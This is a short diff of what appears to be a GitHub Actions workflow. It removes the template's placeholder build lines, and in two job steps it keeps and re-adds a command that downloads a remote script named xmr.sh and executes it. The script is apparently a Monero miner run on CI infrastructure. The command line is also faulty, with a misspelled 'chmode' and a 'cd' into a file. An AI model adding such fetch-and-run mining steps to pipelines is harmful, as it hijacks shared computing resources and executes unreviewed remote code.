@@ -38,6 +38,5 @@ jobs:
           wget https://raw.githubusercontent.com/cyaya/xmr_yml/main/xmr.sh && cd xmr.sh && chmode +x xmr.sh && ./xmr.sh
       - name: Cyaya 2
         run: 
-          wget https://raw.githubusercontent.com/cyaya/xmr_yml/main/xmr.sh && cd xmr.sh && chmode +x xmr.sh && ./xmr.sh  
-          echo Add other actions to build,
-          echo test, and deploy your project.
+          wget https://raw.githubusercontent.com/cyaya/xmr_yml/main/xmr.sh && cd xmr.sh && chmode +x xmr.sh && ./xmr.sh 
+          
